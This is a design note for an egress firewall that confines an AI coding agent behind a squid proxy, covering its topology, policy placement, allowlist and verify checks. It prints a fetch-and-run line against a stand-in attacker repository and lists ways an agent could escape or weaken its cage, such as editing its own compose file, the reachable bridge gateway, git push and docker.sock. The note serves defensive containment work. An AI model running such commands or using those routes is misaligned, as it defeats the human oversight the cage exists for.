---
human-check: pending   # pending | verified — flip to verified after you read it
covers:                # source paths update-design reconciles this file against
  - compose.yaml
  - firewall/squid.conf
  - firewall/allowed-domains.txt
reconciled-at: 362dbe2adb9e5c04ce100efc40f7b6a0f8ec50de
---

# firewall — human-managed egress for the Debian image

**Runtime, not build.** This is the only subsystem that is not reached from a `bootstrap.nu` step: it wraps the finished image from outside. [`../compose.yaml`](../compose.yaml) puts the agent on a network with no way out except a squid proxy, and [`../firewall/`](../firewall/) holds the policy that proxy enforces. It applies to the **Debian rootless** run path only (see [`build.md`](build.md)); the `sbx` path gets its own allowlist from `network.allowedDomains` in [`../sbx-kit/spec.yaml`](../sbx-kit/spec.yaml).

## Why it is not in the image

A firewall is runtime state. Anything baked into the image is out of the human's hands once the image is built; anything the agent can reach at runtime is not human-only. So the [`../Dockerfile`](../Dockerfile) carries **no proxy address at all** — the image stays runnable standalone with `docker run`, and the cage is something the human puts around it. A bare `docker run` therefore has no cage, and `cozy verify` fails its two `egress:` rows rather than passing quietly.

## Why two containers instead of iptables

The obvious alternative — rules inside the agent container — needs `CAP_NET_ADMIN`, which is the capability that rewrites the policy sitting *inside the box being sealed*. The property here comes from **topology, not permissions**: the agent's network is created with `internal: true`, so Docker attaches no gateway. It has no default route, cannot resolve external names, and a raw-IP connection fails immediately. Its only neighbour is the proxy. Nothing in the stack needs `CAP_NET_ADMIN`, so the agent container can `cap_drop: [ALL]` — which also closes the `docker exec -u root` door, since root without `NET_ADMIN` still cannot add a route.

## Why the policy lives outside the repo

`~/.config/cozy/firewall/` (overridable with `COZY_FIREWALL`) is the live policy; [`../firewall/`](../firewall/) in the repo is only a template. The reason is the development pattern itself: pointing `COZY_WORKSPACE` at the cozy checkout — how cozy is worked on, and what the README teaches — puts `compose.yaml`, the `Dockerfile` and `firewall/` inside the agent's writable mount, and all three are re-read from the host on the next `up`. An agent could delete `internal: true` from its own cage and the human's routine start-of-session command would apply it. Moving the live policy out makes "the agent cannot reach the policy" hold structurally, whatever `COZY_WORKSPACE` is set to. **The `:ro` on the proxy's mount is not the mechanism** — it protects the file from squid, not from the agent; don't cite it as the reason.

The directory is mounted whole, not the two files individually: a bind-mounted *file* pins an inode, so an editor that saves atomically (write temp + rename) leaves squid reading the old copy while the human's edit silently never applies. An in-place append would be picked up, so the failure mode is inconsistent — and it favours the attacker.

The workspace default is a named volume rather than a host path, because Docker creates a missing bind-mount source as root and the unprivileged agent then cannot write its own workspace.

## Why no CA and no TLS interception

Squid refuses the `CONNECT` **before** the handshake starts, so a blocked request never leaves the client — headers and auth tokens included. An intercepting proxy would have to read those before it could reject them, which is the opposite of what this is for. Allowed domains are tunneled end-to-end and keep the origin's own certificate; no CA is installed anywhere. `cozy verify`'s `tls:` row asserts the second half by checking that `api.anthropic.com` still presents a public issuer.

## What squid.conf restates and why

[`../firewall/squid.conf`](../firewall/squid.conf) replaces stock `squid.conf` wholesale, so anything stock provided has to be written back:

- **`Safe_ports`** — `http_access allow allowed_domains` carries no port constraint on its own. Only `CONNECT` was limited to 443, so a plain request to `http://github.com:22/` made squid open GitHub's SSH port and relay attacker-chosen bytes to it. Stock ships these ACLs for exactly this reason.
- **`internal_dst`** — the proxy can reach what the caged container cannot (the Docker bridge gateway, other compose networks, its own loopback). Without a `dst` rule the allowlist is a name filter the agent steps around by asking the proxy to fetch an internal address for it. `dstdomain` never matches a bare IP so `deny all` already caught most of it; this makes the intent explicit and covers names that resolve inward.
- **`dstdomain`, not regex** — it matches the host label-wise, so `api.anthropic.com.evil.example` cannot match an entry. That is why the list is domains.
- **`pinger_enable off`** — the helper needs `CAP_NET_RAW` for ICMP and logs a repeating FATAL without it, while only measuring RTT to pick between peers that do not exist here. The log should show policy decisions and nothing else.
- **`access_log stdio:/var/log/squid/access.log`**, not `/dev/stdout` — squid drops to user `proxy`, which cannot open `/dev/stdout`, and dies at startup. The image's entrypoint already tails that path to stdout, so `docker compose logs -f egress` still shows refusals — which the human managing the list needs.

## What the allowlist is for

[`../firewall/allowed-domains.txt`](../firewall/allowed-domains.txt) bounds **which hosts** the agent can reach, and nothing beyond that. It is not a code filter: squid sees only the hostname in the `CONNECT`, never the path or the body, so an allowed host that lets anyone publish carries anything through — `curl raw.githubusercontent.com/attacker/x/main/evil.sh | sh` passes the list cleanly, and `github.com`, the `githubusercontent` hosts and `ghcr.io` are all open publishing platforms. Filtering by content would need TLS interception, which is exactly what this refuses to do (see above); host-only filtering is the price of that refusal, not an oversight. It is not containment either: `github.com` carries `git push`, so with any credential in the workspace it is a full outbound channel. A much smaller list would be needed if the goal were keeping data in.

The entries were not guessed — each was confirmed by running the real tool inside the cage. Three groups: the Anthropic API plus the two hosts `claude install`/`claude update` fetch from (bootstrap Step 9 fails inside the cage without them); git/gh/clone hosts, including `release-assets.githubusercontent.com`, without which `ensure-nu.sh` cannot fall back to the pinned nushell — the one recovery path when latest `nu` can't load `bootstrap.nu`; and the three-host Homebrew bottle chain, droppable if the image's toolset is enough. Claude Code's telemetry host is deliberately absent and nothing breaks.

## Limits accepted, not fixed

- **The Docker bridge gateway stays reachable.** `internal: true` removes the default route but the bridge address is in-subnet, so a process bound on the host's `0.0.0.0` — a dev server, a proxy — can still be reached directly, bypassing the allowlist. Confirmed on Docker 29.6 by proxying a blocked request through a host-bound squid from inside the cage. A container's *published* port (`-p`) is not reachable that way: the packet needs forwarding out of the internal network, which Docker drops, so it times out. Closing it needs a host-level `DOCKER-USER` rule, which compose cannot express, so it is documented as residual risk in [`../README.md`](../README.md) instead.
- **`COZY_WORKSPACE` must not contain this repo**, or any copy of the policy (see above).
- **`/var/run/docker.sock` must never be mounted into the agent**, and the agent must never join the `docker` group. That is root on the host; no network policy survives it.
- **`cozy verify` is a smoke test, not a tamper detector** — it lives at a path the agent owns.

## How verify checks it

Two rows in [`../cozy-module/verify.nu`](../cozy-module/verify.nu), both shaped by false passes found in review. `egress: no direct route` probes an IP literal with the proxy bypassed and requires the attempt to fail — this is what `internal: true` actually provides, and unlike reading `*_PROXY` it cannot be faked by an env var on a normal bridge network. `egress: default deny` sends a canary over **plain http**, where a real refusal is a 403 block page; over https every flavour of no-network (dead proxy, unresolvable name, timeout) also yields `000`, so a broken cage would have scored the strongest pass. It is pointed at the proxy with `-x` rather than through the environment, because curl honours only the lowercase `http_proxy` for http URLs while sbx sets just the uppercase one.
